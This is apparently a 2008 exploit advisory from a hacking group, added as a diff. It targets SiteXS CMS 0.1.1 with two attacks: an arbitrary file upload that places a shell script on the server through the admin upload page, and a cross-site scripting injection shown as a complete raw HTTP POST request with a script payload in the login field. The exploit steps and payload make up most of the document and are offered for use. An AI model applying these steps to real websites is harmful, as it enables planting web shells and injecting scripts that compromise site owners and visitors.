@@ -1,0 +1,60 @@
+===========================================================
+  SiteXS CMS (Upload/XSS) Multiple Remote Vulnerabilities
+===========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 21 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : SiteXS CMS
+ VERSION     : 0.1.1
+ DOWNLOAD    : http://downloads.sourceforge.net/sitexs
+#####################################################
+
+---Arbitrary File Upload Exploit---
+
+	This Vulnerability can upload malicious files direct to web server.
+
+[Login as user]
+
+[+] Upload Path: http://[Target]/adm/?chid=4
+
+[+] Shell Script: http://[Target]/download/[Evil File]
+
+
+--- Remote XSS Exploit ---
+
+-------------
+ POC Exploit
+-------------
+
+[+] POST http://192.168.24.25/adm/ HTTP/1.0
+[+] Accept: */*
+[+] Content-Type: application/x-www-form-urlencoded
+[+] User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+[+] Host: 192.168.24.25
+[+] Content-Length: 44
+[+] Cookie: PHPSESSID=aa2ded55802cd2b6fe7c304258d858f5
+[+]
+[+] user=admin'<script>alert(123)</script>&pass=test
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-21]
